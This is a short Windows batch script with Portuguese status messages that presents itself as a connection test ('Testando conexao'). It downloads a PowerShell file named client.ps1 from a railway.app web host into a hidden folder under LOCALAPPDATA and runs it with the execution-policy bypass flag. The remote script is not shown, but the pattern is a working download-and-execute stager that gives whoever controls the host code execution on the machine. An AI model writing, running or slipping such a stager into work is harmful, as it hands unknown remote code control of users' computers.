@echo off
echo Testando conexao...
echo.

set "folder=%LOCALAPPDATA%\testdebug"
set "url=https://web-production-9d7cc.up.railway.app/client.ps1"
set "file=%folder%\test.ps1"

echo Criando pasta...
if not exist "%folder%" mkdir "%folder%"

echo Baixando client.ps1...
powershell -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%url%','%file%')"

echo.
echo Verificando arquivo...
if exist "%file%" (
    echo Arquivo baixado com sucesso!
    echo Tamanho:
    for %%A in ("%file%") do echo %%~zA bytes
) else (
    echo ERRO: Arquivo nao foi baixado!
)

echo.
echo Executando script...
powershell -ep bypass -f "%file%"

echo.
echo Fim do teste
pause
